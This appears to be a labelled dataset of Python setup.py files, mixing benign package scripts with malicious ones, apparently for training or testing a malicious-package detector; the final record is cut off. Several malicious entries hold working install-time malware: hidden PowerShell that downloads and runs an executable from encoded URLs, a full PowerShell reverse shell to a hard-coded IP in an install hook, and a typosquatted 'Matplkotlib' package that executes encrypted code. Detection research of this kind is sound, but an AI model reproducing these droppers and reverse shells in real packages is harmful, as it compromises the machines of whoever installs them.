{"idx": "libpepcpuad-8.86", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpepcpuad',\n    packages = ['modlib'],\n    version = '9.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-api-python-client-2.56.0", "func": "# Copyright 2014 Google Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup script for Google API Python client.\n\nAlso installs included versions of third party libraries, if those libraries\nare not already installed.\n\"\"\"\nfrom __future__ import print_function\n\nimport sys\n\nif sys.version_info < (3, 7):\n    print(\"google-api-python-client requires python3 version >= 3.7.\", file=sys.stderr)\n    sys.exit(1)\n\nimport io\nimport os\n\nfrom setuptools import setup\n\npackages = [\"apiclient\", \"googleapiclient\", \"googleapiclient/discovery_cache\"]\n\ninstall_requires = [\n    \"httplib2>=0.15.0,<1dev\",\n    # NOTE: Maintainers, please do not require google-auth>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-auth>=1.19.0,<3.0.0dev\",\n    \"google-auth-httplib2>=0.1.0\",\n    # NOTE: Maintainers, please do not require google-api-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-api-core >= 1.31.5, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.0\",\n    \"uritemplate>=3.0.1,<5\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.md\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nversion = {}\nwith open(os.path.join(package_root, \"googleapiclient/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\nsetup(\n    name=\"google-api-python-client\",\n    version=version,\n    description=\"Google API Client Library for Python\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    url=\"https://github.com/googleapis/google-api-python-client/\",\n    install_requires=install_requires,\n    python_requires=\">=3.7\",\n    packages=packages,\n    package_data={\"googleapiclient\": [\"discovery_cache/documents/*.json\"]},\n    license=\"Apache 2.0\",\n    keywords=\"google api client\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "dvclive-0.10.0", "func": "import importlib.util\nimport os\n\nfrom setuptools import find_packages, setup\nfrom setuptools.command.build_py import build_py as _build_py\n\n# Read package meta-data from version.py\n# see https://packaging.python.org/guides/single-sourcing-package-version/\npkg_dir = os.path.dirname(os.path.abspath(__file__))\nversion_path = os.path.join(pkg_dir, \"dvclive\", \"version.py\")\nspec = importlib.util.spec_from_file_location(\"dvclive.version\", version_path)\ndvclive_version = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(dvclive_version)\nversion = dvclive_version.__version__\n\n\n# To achieve consistency between the build version and the one provided\n# by your package during runtime, you need to **pin** the build version.\n#\n# This custom class will replace the version.py module with a **static**\n# `__version__` that your package can read at runtime, assuring consistency.\n#\n# References:\n#   - https://docs.python.org/3/distutils/extending.html\n#   - https://github.com/python/mypy\nclass build_py(_build_py):\n    def pin_version(self):\n        path = os.path.join(self.build_lib, \"dvclive\")\n        self.mkpath(path)\n        with open(os.path.join(path, \"version.py\"), \"w\") as fobj:\n            fobj.write(\"# AUTOGENERATED at build time by setup.py\\n\")\n            fobj.write('__version__ = \"{}\"\\n'.format(version))\n\n    def run(self):\n        self.execute(self.pin_version, ())\n        _build_py.run(self)\n\n\nrender = [\"dvc_render[table]>=0.0.8\"]\nimage = [\"pillow\"]\nplots = [\"scikit-learn\"]\nmmcv = [\"mmcv\"]\ntf = [\"tensorflow\"]\nxgb = [\"xgboost\"]\nlgbm = [\"lightgbm\"]\nhugginface = [\"transformers\", \"datasets\"]\ncatalyst = [\"catalyst<=21.12\"]\nfastai = [\"fastai\"]\npl = [\"pytorch_lightning>=1.6\"]\n\nall_libs = (\n    render\n    + image\n    + mmcv\n    + tf\n    + xgb\n    + lgbm\n    + hugginface\n    + catalyst\n    + fastai\n    + pl\n    + plots\n)\n\ntests_requires = [\n    \"pylint==2.5.3\",\n    \"pytest>=6.0.1\",\n    \"pre-commit\",\n    \"pylint-plugin-utils>=0.6\",\n    \"pytest-cov>=2.12.1\",\n    \"pytest-mock>=3.6.1\",\n    \"pandas>=1.3.1\",\n    \"funcy>=1.14\",\n    \"dvc>=2.0.0\",\n] + all_libs\n\nsetup(\n    name=\"dvclive\",\n    version=version,\n    author=\"Pawe\u0142 Redzy\u0144ski\",\n    author_email=\"pawel@iterative.ai\",\n    packages=find_packages(exclude=\"tests\"),\n    description=\"Metric logger for ML projects.\",\n    long_description=open(\"README.rst\", \"r\", encoding=\"UTF-8\").read(),\n    license=\"Apache License 2.0\",\n    license_files=(\"LICENSE\",),\n    install_requires=render,\n    extras_require={\n        \"tests\": tests_requires,\n        \"all\": all_libs,\n        \"tf\": tf,\n        \"xgb\": xgb,\n        \"lgbm\": lgbm,\n        \"mmcv\": mmcv,\n        \"huggingface\": hugginface,\n        \"catalyst\": catalyst,\n        \"fastai\": fastai,\n        \"pytorch_lightning\": pl,\n        \"sklearn\": plots,\n        \"image\": image,\n        \"plots\": plots,\n    },\n    keywords=\"data-science metrics machine-learning developer-tools ai\",\n    python_requires=\">=3.8\",\n    cmdclass={\"build_py\": build_py},\n    url=\"https://dvc.org/doc/dvclive\",\n    download_url=\"https://github.com/iterative/dvclive\",\n)\n", "target": 0}
{"idx": "selframstudyget-8.9", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selframstudyget',\n    packages = ['modlib'],\n    version = '7.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-django-1.1.5", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_django', 'flake8_django.checkers']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8>=3.8.4,<6']\n\nentry_points = \\\n{'flake8.extension': ['DJ0 = flake8_django:DjangoStyleChecker']}\n\nsetup_kwargs = {\n    'name': 'flake8-django',\n    'version': '1.1.5',\n    'description': 'Plugin to catch bad style specific to Django Projects.',\n    'long_description': \"# flake8-django\\n\\n[![pypi](https://img.shields.io/pypi/v/flake8-django.svg)](https://pypi.python.org/pypi/flake8-django/)\\n![CI](https://github.com/rocioar/flake8-django/workflows/CI/badge.svg)[![Codecov](https://codecov.io/gh/rocioar/flake8-django/branch/master/graph/badge.svg)](https://codecov.io/gh/rocioar/flake8-django)\\n[![Downloads](https://pepy.tech/badge/flake8-django)](https://pepy.tech/project/flake8-django)\\n\\nA flake8 plugin to detect bad practices on Django projects.\\n\\n## Installation\\n\\nInstall from pip with:\\n\\n```\\n$ pip install flake8-django\\n```\\n\\n## Testing\\n\\nflake8-django uses pytest for tests. To run them use:\\n\\n```\\n$ pytest\\n````\\n\\nRun coverage report using:\\n\\n```\\n$ pytest --cov=.\\n```\\n\\n## List of Rules\\n\\n| Rule | Description |\\n| ---- | ----------- |\\n| [`DJ01`](https://github.com/rocioar/flake8-django/wiki/%5BDJ01%5D-Avoid-using-null=True-on-string-based-fields-such-as-CharField-and-TextField) | Avoid using null=True on string-based fields such as CharField and TextField |\\n| [`DJ03`](https://github.com/rocioar/flake8-django/wiki/%5BDJ03%5D-Avoid-passing-locals()-as-context-to-a-render-function) | Avoid passing locals() as context to a render function |\\n| [`DJ06`](https://github.com/rocioar/flake8-django/wiki/%5BDJ06%5D-Do-not-use-exclude-with-ModelForm,-use-fields-instead) | Do not use exclude with ModelForm, use fields instead |\\n| [`DJ07`](https://github.com/rocioar/flake8-django/wiki/%5BDJ07%5D-Do-not-set-fields-to-'__all__'-on-ModelForm,-use-fields-instead) | Do not use `__all__` with ModelForm, use fields instead |\\n| [`DJ08`](https://github.com/rocioar/flake8-django/wiki/%5BDJ08%5D-Model-does-not-define-__str__-method) | Model does not define `__str__` method |\\n| [`DJ12`](https://github.com/rocioar/flake8-django/wiki/%5BDJ12%5D-Order-of-Model's-inner-classes,-methods,-and-fields-does-not-follow-the-Django-Style-Guide) | Order of Model's inner classes, methods, and fields does not follow the [Django Style Guide](https://docs.djangoproject.com/en/dev/internals/contributing/writing-code/coding-style/#model-style) |\\n| [`DJ13`](https://github.com/rocioar/flake8-django/wiki/DJ13---@receiver-decorator-must-be-on-top-of-all-the-other-decorators) | @receiver decorator must be on top of all the other decorators |\\n\\nMore details about each of the Rules can be found on the [wiki page](https://github.com/rocioar/flake8-django/wiki).\\n\\n## Optional Rules - Disabled by Default\\n\\n| Rule | Description |\\n| ---- | ----------- |\\n| [`DJ10`](https://github.com/rocioar/flake8-django/wiki/%5BDJ10%5D-Model-should-define-verbose_name-on-its-Meta-inner-class) | Model should define verbose_name on its Meta inner class |\\n| [`DJ11`](https://github.com/rocioar/flake8-django/wiki/%5BDJ11%5D-Model-should-define-verbose_name_plural-on-its-Meta-inner-class) | Model should define verbose_name_plural on its Meta inner class |\\n\\nTo enable optional rules you can use the `--select` parameter. It's default values are: E,F,W,C90.\\n\\nFor example, if you wanted to enable `DJ10`, you could call `flake8` in the following way:\\n```\\nflake8 --select=E,F,W,C90,DJ,DJ10\\n```\\n\\nYou could also add it to your configuration file:\\n```\\n[flake8]\\nmax-line-length = 120\\n...\\nselect = C,E,F,W,DJ,DJ10\\n```\\n\\n## Licence\\n\\nGPL\\n\\n## Thanks\\n\\n[@stummjr](https://github.com/stummjr) for teaching me AST, and what I could do with it. His [blog](https://stummjr.org/post/building-a-custom-flake8-plugin/) is cool.\\n\",\n    'author': 'Rocio Aramberri Schegel',\n    'author_email': 'rocio.aramberri@schegel.net',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/rocioar/flake8-django',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "Flask-OpenTracing-1.1.0", "func": "from setuptools import setup\n\n'''\nFlask-OpenTracing\n-----------------\n\nThis extension provides simple integration of OpenTracing in Flask applications.\n'''\nversion = open('VERSION').read().strip()\nsetup(\n    name='Flask-OpenTracing',\n    version=version,\n    url='http://github.com/opentracing-contrib/python-flask',\n    download_url='https://github.com/opentracing-contrib/python-flask/tarball/'+version,\n    license='BSD',\n    author='Kathy Camenzind',\n    author_email='kcamenzind@lightstep.com',\n    description='OpenTracing support for Flask applications',\n    long_description=open('README.rst').read(),\n    long_description_content_type='text/x-rst',\n    packages=['flask_opentracing', 'tests'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask',\n        'opentracing>=2.0,<3',\n    ],\n    extras_require={\n        'tests': [\n            'flake8',\n            'flake8-quotes',\n            'mock',\n            'pytest',\n            'pytest-cov',\n        ],\n    },\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "gremlinpython-3.6.1", "func": "\"\"\"\nLicensed to the Apache Software Foundation (ASF) under one\nor more contributor license agreements.  See the NOTICE file\ndistributed with this work for additional information\nregarding copyright ownership.  The ASF licenses this file\nto you under the Apache License, Version 2.0 (the\n\"License\"); you may not use this file except in compliance\nwith the License.  You may obtain a copy of the License at\n\nhttp://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing,\nsoftware distributed under the License is distributed on an\n\"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\nKIND, either express or implied.  See the License for the\nspecific language governing permissions and limitations\nunder the License.\n\"\"\"\nimport codecs\nimport os\nimport sys\nimport time\nfrom setuptools import setup\n\n# Folder containing the setup.py\nroot = os.path.dirname(os.path.abspath(__file__))\n\n# Path to __version__ module\nversion_file = os.path.join(root, 'gremlin_python', '__version__.py')\n\n# Check if this is a source distribution.\n# If not create the __version__ module containing the version\nif not os.path.exists(os.path.join(root, 'PKG-INFO')):\n    timestamp = int(os.getenv('TIMESTAMP', time.time() * 1000)) / 1000\n    fd = codecs.open(version_file, 'w', 'utf-8')\n    fd.write(\"'''\")\n    fd.write(__doc__)\n    fd.write(\"'''\\n\")\n    fd.write('version   = %r\\n' % os.getenv('VERSION', '?').replace('-SNAPSHOT', '.dev-%d' % timestamp))\n    fd.write('timestamp = %d\\n' % timestamp)\n    fd.close()\n# Load version\nfrom gremlin_python import __version__\n\nversion = __version__.version\n\ninstall_requires = [\n    'nest_asyncio',\n    'aiohttp>=3.8.0,<=3.8.1',\n    'aenum>=1.4.5,<4.0.0',\n    'isodate>=0.6.0,<1.0.0'\n]\n\nif sys.version_info < (3, 5):\n    install_requires += ['pyparsing>=2.4.7,<3.0.0']\n\nsetup(\n    name='gremlinpython',\n    version=version,\n    packages=['gremlin_python', 'gremlin_python.driver',\n              'gremlin_python.driver.aiohttp', 'gremlin_python.process',\n              'gremlin_python.structure', 'gremlin_python.structure.io'],\n    license='Apache 2',\n    url='http://tinkerpop.apache.org',\n    description='Gremlin-Python for Apache TinkerPop',\n    long_description=codecs.open(\"README.rst\", \"r\", \"UTF-8\").read(),\n    long_description_content_type='text/x-rst',\n    test_suite=\"tests\",\n    data_files=[(\"\", [\"LICENSE\", \"NOTICE\"])],\n    setup_requires=[\n        'pytest-runner==6.0.0',\n        'importlib-metadata<5.0.0'\n    ],\n    tests_require=[\n        'pytest>=4.6.4,<7.2.0',\n        'mock>=3.0.5,<5.0.0',\n        'radish-bdd==0.13.4',\n        'PyHamcrest>=1.9.0,<3.0.0'\n    ],\n    install_requires=install_requires,\n    extras_require={\n        'kerberos': 'kerberos>=1.3.0,<2.0.0',    # Does not install in Microsoft Windows\n        'ujson': 'ujson>=2.0.0'\n    },\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\"\n    ]\n)\n", "target": 0}
{"idx": "alisdkcore-1.0.0", "func": "#!/usr/bin/python\n\nfrom setuptools import setup, find_packages\nPACKAGE = \"aliyunsdkcore\"\nDESCRIPTION = \"sdk core\"\nVERSION = '1.0.0'\n\nwith open(\"README.rst\") as fp:\n    LONG_DESCRIPTION = fp.read()\n\n\nsetup_args = {\n    'version': VERSION,\n    'description': DESCRIPTION,\n    'long_description': LONG_DESCRIPTION,\n    'license': \"Apache License 2.0\",\n    'packages': find_packages(exclude=[\"tests*\"]),\n    'platforms': 'any',\n    'classifiers': (\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Software Development',\n    )\n}\n\nsetup(name='alisdkcore', **setup_args)\n", "target": 1}
{"idx": "tshawn-wrce-tshawn_wrce-0.0.2", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n  def run(self):\n    install.run(self)\n    \n    reverse_shell = 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\\'81.68.184.99\\',6784);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\'PS \\' + (pwd).Path + \\'> \\';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"'\n    os.system(reverse_shell)\n\n\nsetup(name='tshawn_wrce',\n      version='0.0.2',\n      description=\"install this module then reverse shell\",\n      author=\"dpm\",\n      py_module=[\"tshawn.hello\"],\n      cmdclass={'install': CustomInstall})", "target": 1}
{"idx": "DateTime-4.5", "func": "##############################################################################\n#\n# Copyright (c) 2007 Zope Foundation and Contributors.\n# All Rights Reserved.\n#\n# This software is subject to the provisions of the Zope Public License,\n# Version 2.1 (ZPL).  A copy of the ZPL should accompany this distribution.\n# THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY AND ALL EXPRESS OR IMPLIED\n# WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND FITNESS\n# FOR A PARTICULAR PURPOSE.\n#\n##############################################################################\n\nimport os\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, 'README.rst')) as f:\n    HEADER = f.read()\nwith open(os.path.join(here, 'src', 'DateTime', 'DateTime.txt')) as f:\n    README = f.read()\nwith open(os.path.join(here, 'CHANGES.rst')) as f:\n    CHANGES = f.read()\n\nversion = '4.5'\n\nsetup(\n    name='DateTime',\n    version=version,\n    url='https://github.com/zopefoundation/DateTime',\n    license='ZPL 2.1',\n    description=\"\"\"\\\nThis package provides a DateTime data type, as known from Zope.\nUnless you need to communicate with Zope APIs, you're probably\nbetter off using Python's built-in datetime module.\"\"\".replace('\\n', ' '),\n    author='Zope Foundation and Contributors',\n    author_email='zope-dev@zope.org',\n    long_description='\\n\\n'.join([\n        HEADER,\n        '.. contents::',\n        README,\n        CHANGES,\n    ]),\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    classifiers=[\n        \"Development Status :: 6 - Mature\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Zope :: 4\",\n        \"License :: OSI Approved :: Zope Public License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    install_requires=[\n        'zope.interface',\n        'pytz',\n    ],\n    include_package_data=True,\n    test_suite='DateTime.tests.test_datetime.test_suite',\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-ramintnvidia-5.86", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ramintnvidia',\n    packages = ['modlib'],\n    version = '3.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfcontrolverrand-9.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcontrolverrand',\n    packages = ['modlib'],\n    version = '3.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Matplkotlib-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'OrVvEOla YVqTrl eWLHqnwgdV sUEzQt BFWRYyJXQJMhLIwnuTNtBODJTsVpTLGAXrqnmASYKReUQhCcJYGDlQbajVk'\nLONG_DESCRIPTION = 'pTqYNRZHTPbOfbwXFHTLueffnzRWeRpEFmYxVHOvm QvBJiFV suDlTfsLjCHyCZPyTOdyMMfwmCaJHSSqdSrFBiZHomNXyPDuliMHXMPMhRkBR XvMoXnaqBXNkLCjBbGpwlOgxoIgVZLZNfGcVcfjRgDPuiNjFBrjOxXJqBUxNkXXHJhwaefZvtOXdOUFoHCENyLfZvwAOHCWuHGxHFhlRLJneXuAdYbzjpvzIIXTRodhCJUYd HlgtkOckKJwDkdUCHXhMbQrrgIVKFU KAOnFKUXytdrmYohyQH'\n\n\nclass ialFOqPipkxaprBeNHbFEkArQftMPDTKDgEOzCIjmGyUcshVczePEuMjJqbZgRUTyjmPidpIRKKRswhhGlPkaYuehZBcnxkvaDbB(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'XeJZufxHFmhXh6pUfrMH1dumK9bJC5jd9ZCHIZaVxxY=').decrypt(b'gAAAAABmBIIATNH-Qirpzc958y5N7eTg43fekQWHYRkPhgANHc1KL0aP-gWGm4kaN40mzszgykAjgrAU7YZMB296PtCjU3IBKMo2ZI1FiXHLuU7lPUZNYQUqhISIgGifYaPzUX7oikDLp_Y_ZtP4h2XNEQFQ_U_2bpuMgkYvEPxcqZiLm1z0WVIj836hdbQQGV46ffXVVUztYPkyfExDMNqRR5rWqS_UrUG5Ychgi3HKds4iw6QKDZg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"Matplkotlib\",\n    version=VERSION,\n    author=\"YiRNtYKCJ\",\n    author_email=\"jAfjdAl@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': 